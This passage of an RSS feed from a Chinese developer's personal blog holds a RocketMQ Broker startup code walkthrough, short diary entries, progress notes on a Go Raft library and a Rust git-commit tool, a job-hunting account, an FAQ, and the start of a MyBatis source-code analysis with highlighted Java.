&lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">clientHousekeepingService&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">clientHousekeepingService&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">start&lt;/span>&lt;span class="o">();&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">filterServerManager&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">filterServerManager&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">start&lt;/span>&lt;span class="o">();&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="c1">// 启动时，注册该Broker的信息到所有的NameServer
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">registerBrokerAll&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="c1">// 定时注册Broker到Name Server
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">scheduledExecutorService&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">scheduleAtFixedRate&lt;/span>&lt;span class="o">(()&lt;/span> &lt;span class="o">-&amp;gt;&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="k">try&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">registerBrokerAll&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span> &lt;span class="k">catch&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">Exception&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="n">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">error&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;registerBrokerAll Exception&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="o">},&lt;/span> &lt;span class="n">1000&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">10&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">1000&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">30&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">TimeUnit&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">MILLISECONDS&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">brokerStatsManager&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">// 看起来就是一些数据统计线程
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">brokerStatsManager&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">start&lt;/span>&lt;span class="o">();&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="c1">// 删除多余的Topic
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">addDeleteTopicTask&lt;/span>&lt;span class="o">();&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>整个Borker的流程差不多就是这样.代码里并没有什么亮点说实话.&lt;/p></description></item><item><title>日志</title><link>https://sdttttt.github.io/blog/log-2/</link><pubDate>Sun, 11 Oct 2020 14:45:23 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/log-2/</guid><description>
&lt;p>昨天骑自行车下班回来后荨麻疹又犯了, 实在是比较难受, 今天算是去了趟皮肤病医院.&lt;/p>
&lt;p>算是配了点药.
希望能好一点.&lt;/p></description></item><item><title>Sraft (三)</title><link>https://sdttttt.github.io/blog/sraft-3/</link><pubDate>Fri, 09 Oct 2020 10:52:24 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/sraft-3/</guid><description>
&lt;p>经过几天思考, 我决定稍微重新分配一下各个模块的密度.&lt;/p>
&lt;p>&lt;code>RaftKernel&lt;/code>中的&lt;code>Solt&lt;/code>为本次的重点.对&lt;code>RaftKernel&lt;/code>来说&lt;code>Solt&lt;/code>为一个黑盒.&lt;code>Solt&lt;/code>对外处理所有事件,但是不暴露实现.
内部的状态机转化也对&lt;code>RaftKernel&lt;/code>进行隐藏.&lt;code>RaftKernel&lt;/code>只要接受外界AE, 交给&lt;code>Solt&lt;/code>, &lt;code>Solt&lt;/code>反馈相应的事件, &lt;code>RaftKernel&lt;/code>进行处理.&lt;/p>
&lt;p>挖藕, 希望这次有效.&lt;img src="https://idanmu.net/2020/10/c003543193753.jpg" alt="dc77f6e30c4b4dba807b4a84b29c74d4.jpg">&lt;/p></description></item><item><title>Essays</title><link>https://sdttttt.github.io/blog/essays/</link><pubDate>Tue, 06 Oct 2020 12:34:31 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/essays/</guid><description>
&lt;p>前几天去朋友那边玩了一趟, 事实上并没有什么好玩的.
这几天什么也没做. sraft也没有什么进展.&lt;/p>
&lt;p>我又重新对Ruby on Rails 感兴趣了.但是没有一个很好的环境写这个东西.还是算了.&lt;/p>
&lt;p>还是想想下一个项目写什么比较好.&lt;/p></description></item><item><title>GRC (二)</title><link>https://sdttttt.github.io/blog/grc-2/</link><pubDate>Thu, 01 Oct 2020 15:24:27 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/grc-2/</guid><description>
&lt;p>昨天姑且算是完成了GRC的开发. push这个命令不是很想加,想了一下也没有必要.&lt;/p>
&lt;p>GRC的&lt;code>0.8.0&lt;/code>版本昨天算是发布了, 应该也算是头一次正经的用Rust来开发软件.&lt;/p>
&lt;p>在crate.io上看起来有100的安装了. 不知道他们脸上是什么表情 wwww&lt;/p>
&lt;p>希望GRC能给他们带去方便吧.&lt;/p>
&lt;p>当然, GRC的终点还没到. 我会一直使用这个工具. 碰到BUG或者有新想法肯定会去更新.况且现在连&lt;code>1.0.0&lt;/code>版本都还没到.&lt;/p>
&lt;p>接下来主要工作会专注到学习加密算法,和sraft的开发上.&lt;/p>
&lt;p>&amp;hellip;sraft一直都没有什么好的想法啊&amp;hellip;&lt;/p></description></item><item><title>GRC (一)</title><link>https://sdttttt.github.io/blog/grc-1/</link><pubDate>Sat, 26 Sep 2020 14:49:17 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/grc-1/</guid><description>
&lt;p>ooo! 一个不错的消息.&lt;/p>
&lt;p>目前GRC的commit规范的功能已经完全实现了.
之前还说要几个星期, 看来比我想得要快很多
&lt;del>👴勤勉&lt;/del>
基本上已经和git-cz有着完全一致的功能.
我也已经把GRC发布在了crates.io网站上.
在crates.io上搜索grc就能看到.
同时我也在v2ex上写了关于GRC的文章.&lt;/p>
&lt;p>开发也会继续进行, GRC会在以后为你提供更方便的功能.
我也期待有人能参与到这个项目中来.&lt;/p>
&lt;p>希望GRC能帮助更多人.&lt;/p></description></item><item><title>sraft (二)</title><link>https://sdttttt.github.io/blog/sraft-2/</link><pubDate>Tue, 22 Sep 2020 12:08:44 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/sraft-2/</guid><description>
&lt;p>昨天草草的完成了通信协议适配器, 至少能做到自由切换协议,
纵看整个编程模型还是有缺陷,
StateMachine的内部结构比我想的要复杂的多,
多个状态实现的切换,以及对一些内部事件的触发.
StateMachine模块的密度和其他模块完全不同. 反而RaftKernel存在的意义却减小了.&lt;/p>
&lt;p>经过昨天晚上和今早的考虑, 我决定将StateMachine作为一个Slot,接入到RaftKernel中去,
RaftKernel现在同时也是状态机本身, Slot是可变的, 可以有Leader, Follower, Candidate三种插槽,每个Slot都有不同的扩展字段, 比如Leader会需要登记每个Node的同步日志的深度以及状态. 并且每个Slot都有自己的事件处理实现.&lt;/p>
&lt;p>没想到第一天开发结束就会遇到麻烦, 看来sraft以后的苦难还不少&amp;hellip;&lt;/p></description></item><item><title>Sraft (一)</title><link>https://sdttttt.github.io/blog/sraft-1/</link><pubDate>Mon, 21 Sep 2020 11:29:51 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/sraft-1/</guid><description>
&lt;p>今天开始算是正式编写Sraft这个库, 开发的原因有两个:&lt;/p>
&lt;ul>
&lt;li>我需要通过这次开发来熟悉Raft这个协议.&lt;del>(以后面试或者和人攀谈也更有底气)&lt;/del>&lt;/li>
&lt;li>我的微服务框架的服务中心需要一个能达成分布式一致性的功能.&lt;/li>
&lt;/ul>
&lt;p>语言采用的是Go, 目前的编程模型大概也完成了, 下面我来介绍:&lt;/p>
&lt;blockquote>
&lt;p>本人喜欢简单并且高效的设计, 对于设计复杂难以实现的东西会感到不适(脑子不够用),&lt;/p>
&lt;/blockquote>
&lt;h3 id="raft-kernel">Raft Kernel&lt;/h3>
&lt;p>整个编程模型会有比较多的模块, 整体采用的是微核架构, &lt;code>Raft Kernel&lt;/code>会协调各个模块之间的工作.&lt;/p>
&lt;p>模块之间的通信由&lt;code>Raft Kernel&lt;/code>来完成. 通信方式采用&lt;code>Channel&lt;/code>异步非阻塞的形式.&lt;/p>
&lt;h3 id="exchange-network">Exchange Network&lt;/h3>
&lt;p>外部通信从这里进入, 由&lt;code>Exchange Network&lt;/code>将通信内容封装为事件, 发送给&lt;code>Raft Kernel&lt;/code>.&lt;/p>
&lt;p>或者&lt;code>Raft Kernel&lt;/code>传递事件给&lt;code>Exchange Network&lt;/code>, 再由&lt;code>Exchange Network&lt;/code>执行外部通信.&lt;/p>
&lt;h3 id="state-machine">State Machine&lt;/h3>
&lt;p>Raft协议的核心实现, 状态机会在&lt;code>Leader&lt;/code>, &lt;code>Follower&lt;/code>, &lt;code>Candidate&lt;/code>三种角色之间自动切换,
每一角色处理的事件都是一样的, 但是具体过程是不一样的. (这个部分的密度会比较大)&lt;/p>
&lt;h3 id="data-log-synchronizer">Data Log Synchronizer&lt;/h3>
&lt;p>负责同步数据的模块, 采用的是日志提交形式.&lt;/p>
&lt;hr>
&lt;p>以上的我目前已经构思出的编程模型, 但是为暂定. 实际的编写模型肯定会有少许修改.&lt;/p>
&lt;p>PROJECT: github.com/sdttttt/sraft&lt;/p></description></item><item><title>About Gcr</title><link>https://sdttttt.github.io/blog/about-gcr/</link><pubDate>Sun, 20 Sep 2020 13:20:06 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/about-gcr/</guid><description>
&lt;p>十多天前, 我创建了GCR这个项目, 原因比较纯粹,
我是个命令行工具爱好者, 我认为命令行能带来更好的工作效率以及收益,
我平时编码, 也是遵守Git提交规范的,
使用&lt;code>Node.js&lt;/code>平台上的&lt;code>git-cz&lt;/code>工具来格式化我的提交信息,
不过由于它属于&lt;code>Node.js&lt;/code>这个平台, 不可避免, 你需要安装Node.js的runtime环境.&lt;/p>
&lt;p>我想要一种更加方面快速的工具, 所以我建立了GCR这个项目,
它是使用&lt;code>Rust&lt;/code>编写的, 不需要安装任何环境, 比起Node, 它会更快, 而且保留了跨平台的特性.
在GCR中我还会加入一些比较个性化的元素. GCR看起来可能会是一个更好用的&lt;code>Git?&lt;/code>.&lt;/p>
&lt;p>这个项目可能还需要几个星期的时间, 请期待吧.&lt;/p></description></item><item><title>FAQ</title><link>https://sdttttt.github.io/blog/faq/</link><pubDate>Sat, 19 Sep 2020 20:15:53 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/faq/</guid><description>
&lt;p>以前一些小白经常问我的问题.&lt;/p>
&lt;p>Q: 我想自己建立一个网站, 我应该使用什么技术?&lt;/p>
&lt;p>A: Ruby on Rails.&lt;/p>
&lt;blockquote>
&lt;p>ROR是一款老牌的WEBMVC框架, 到现在有10多年的历史了. 在中国, ROR使用的并不多,
这并不能说明它不优秀, ROR拥有非常多的功能模块, 几乎没有ROR做不到的.
论开发效率,ROR绝对能满足你, Ruby这个语言, 如果你有去学过,
会发现他的语法非常的随意. 自己造一个语法Ruby都能支持, 我认为, Ruby是在所有语言中开发体验最好的语言. 良好的开发体验加上优秀的开发效率, ROR是值得你去使用的.&lt;/p>
&lt;/blockquote>
&lt;p>Q: 我想写一点小工具, 我应该用什么语言?&lt;/p>
&lt;p>A: Python.&lt;/p></description></item><item><title>日志</title><link>https://sdttttt.github.io/blog/log-1/</link><pubDate>Sat, 19 Sep 2020 11:06:17 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/log-1/</guid><description>
&lt;p>目前还是个5月份刚毕业的应届生, 今年还是撞到了疫情这个时间口上,
工作真是相当的难找, 6月到7月的样子, 我去尝试去考驾照, 目前还在科目二这边卡着,
中间有空也是各种找单位去面试.&lt;/p>
&lt;p>比较幸运, 我在8月初的时候收到了来自安恒信息的面试通知, 他们是一家上市公司, 规模也不小, 我也是被别人内推才有这个面试资格的, 面试一共三轮, 前两轮技术面试, 最后一轮综合面试, 第一轮技术面试大概就是问了我一些JVM原理, 以及编码思路, 还有一些我比较擅长的分布式存储的问题. 第一轮过的呢也还算惊险. 第二轮是在几天后, 问的内容基本上是一些JDK源码, 数据结构, 还有一些框架问题.我回答的还算是流畅, 也算是过了.可惜,最后一轮面试之前,因为安恒不招收985,211以外的应届生, 所以我被淘汰了.&lt;/p>
&lt;p>后面每天在晚上投简历, 大概在一个月后, 又有新的面试来了, 一家叫做郦鸣科技的公司, 面试官问的都是一些业务处理逻辑, 身为应届生的我也是吃了亏, 因为我根本没有实际的工作经验. 不过我还是以试用生的身份进去了.&lt;/p>
&lt;p>新人入职第一天就是先把公司项目的代码过一边, 看了他们公司的代码之后, 说实话, 我非常失望, 复杂的对象关系结构, 长冗的控制器函数, 以及空空如也的test文件夹, 我不知道他们的项目能维护多长时间, 可能是我的想法太极端了, 大学时的我就开始受到马丁福勒的软件设计思想的影响, 对维护性差的代码变得敏感起来. 我边读他们的代码, 边重构着. 就这样过了一个星期.&lt;/p>
&lt;p>在这周里, 我还收到了来自电信和一家电子交易公司的面试通知, 我很高兴, 因为我对现在的工作并不感到满足, 在周五, 我请了假, 去面试, 电信这边很顺利, 面试官和我说, 他喜欢我的开源项目, 并且对我的CICD技术感兴趣, 而且他也不关心我的学历, 我真的很高兴.不过在录用之前,面试官说得先和上级汇报, 因为录不录用不是他能决定的.&lt;/p>
&lt;p>下午, 我去了那家电子交易公司面试, 不过应届生在他们公司面试之前得先做试卷, 内容是关于Java的, 我有点吃惊, 不过我也发现了, 对于一些java代码的运行细节我还了解的不够清楚, 在这里又发现了自己的缺点, 我感到很满足. 试卷完成后, 就是面谈了, 面试官看起来接近30岁, 他先问了我的开源项目的问题, 接着是一些Java基础的问题, 最后又考了考我的业务能力, 他出了一个秒杀题, 我回答的并不算好, 应该只答对了一半.
这次的面试应该是凉了.回家的路上我就是这样想的.&lt;/p>
&lt;p>最后希望电信的面试能够顺利吧.&lt;/p></description></item><item><title>MyBatis 源码分析</title><link>https://sdttttt.github.io/blog/mybatissourcecode/</link><pubDate>Thu, 10 Sep 2020 22:15:42 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/mybatissourcecode/</guid><description>
&lt;p>其实很早就想写一篇 iBatis 的源码分析了, 不过有段时间去学习 Go 了, Java 就放下了, 最近
重新捡起 Java 就把以前没填的坑,填一下.&lt;/p>
&lt;h1 id="init">Init&lt;/h1>
&lt;p>现在开始正片.&lt;/p>
&lt;p>首先是 iBatis 的初始化工作.我们看下面的代码:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-Java" data-lang="Java">&lt;span class="c1">// `BlogDataSourceFactory`的主要作用: 通过你的配置文件, 初始化一个DataSource
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">DataSource&lt;/span> &lt;span class="n">dataSource&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">BlogDataSourceFactory&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getBlogDataSource&lt;/span>&lt;span class="o">();&lt;/span>
&lt;span class="c1">// JdbcTransactionFactory一个New就能得到, 没什么依赖条件
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">TransactionFactory&lt;/span> &lt;span class="n">transactionFactory&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">JdbcTransactionFactory&lt;/span>&lt;span class="o">();&lt;/span>
&lt;span class="c1">// Environment要你交出数据源和事务工厂还有你的环境是开发还是生产
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">Environment&lt;/span> &lt;span class="n">environment&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">Environment&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;development&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">transactionFactory&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">dataSource&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="c1">// Configuration有基本上你所有的配置
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">Configuration&lt;/span> &lt;span class="n">configuration&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">Configuration&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">environment&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="c1">// 添加你的mapper到配置列表中, 等会我们去分析它
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">configuration&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">addMapper&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">BlogMapper&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">class&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="c1">// 通过你的配置类,让我们初始化一个SqlSessionFactory! 我们终于进入正题了!!
&lt;/span>&lt;span class="c1">// 可能你觉得很快... 其实本人在这里面分析还是花了很长时间
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">SqlSessionFactory&lt;/span> &lt;span class="n">sqlSessionFactory&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">SqlSessionFactoryBuilder&lt;/span>&lt;span class="o">().&lt;/span>&lt;span class="na">build&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">configuration&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>好, 上文有说&lt;code>configuration.addMapper(BlogMapper.class)&lt;/code>这个方法, 现在我们来分析一下它.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-Java" data-lang="Java">
&lt;span class="c1">// 这个是Configuration中的方法, 它实际上是委托mapperRegistry去执行
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">addMapper&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">Class&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">type&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="n">mapperRegistry&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">addMapper&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">type&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="kd">public&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">addMapper&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">Class&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">type&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">//mapper必须是接口
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">type&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">isInterface&lt;/span>&lt;span class="o">())&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">hasMapper&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">type&lt;/span>&lt;span class="o">))&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">//如果重复添加了，报错
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">throw&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">BindingException&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;Type &amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">type&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s">&amp;#34; is already known to the MapperRegistry.&amp;#34;&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="kt">boolean&lt;/span> &lt;span class="n">loadCompleted&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">false&lt;/span>&lt;span class="o">;&lt;/span>
&lt;span class="k">try&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">// 加入一个Mapper的代理生产工厂
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">knownMappers&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">put&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">type&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">MapperProxyFactory&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="o">&amp;gt;(&lt;/span>&lt;span class="n">type&lt;/span>&lt;span class="o">));&lt;/span>
&lt;span class="c1">// It&amp;#39;s important that the type is added before the parser is run
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// otherwise the binding may automatically be attempted by the
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// mapper parser. If the type is already known, it won&amp;#39;t try.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 这个是通过注解来构建Mapper, 暂时不看
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">MapperAnnotationBuilder&lt;/span> &lt;span class="n">parser&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">MapperAnnotationBuilder&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">config&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">type&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="n">parser&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">parse&lt;/span>&lt;span class="o">();&lt;/span>
&lt;span class="n">loadCompleted&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">true&lt;/span>&lt;span class="o">;&lt;/span>
&lt;span class="o">}&lt;/span> &lt;span class="k">finally&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">//如果加载过程中出现异常需要再将这个mapper从mybatis中删除
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="o">(!&lt;/span>&lt;span class="n">loadCompleted&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="n">knownMappers&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">remove&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">type&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="sqlsessionfactory">SqlSessionFactory&lt;/h1>
&lt;p>既然有了 SqlSessionFactory，顾名思义，我们可以从中获得 SqlSession 的实例。
SqlSession 提供了在数据库执行 SQL 命令所需的所有方法。
你可以通过 SqlSession 实例来直接执行已映射的 SQL 语句。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-Java" data-lang="Java">&lt;span class="k">try&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">SqlSession&lt;/span> &lt;span class="n">session&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sqlSessionFactory&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">openSession&lt;/span>&lt;span class="o">())&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="n">BlogMapper&lt;/span> &lt;span class="n">mapper&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">session&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getMapper&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">BlogMapper&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">class&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="n">Blog&lt;/span> &lt;span class="n">blog&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">mapper&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">selectBlog&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">101&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>好! 我们快进到&lt;del>曹丕&lt;/del>sqlSessionFactory.openSession()&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
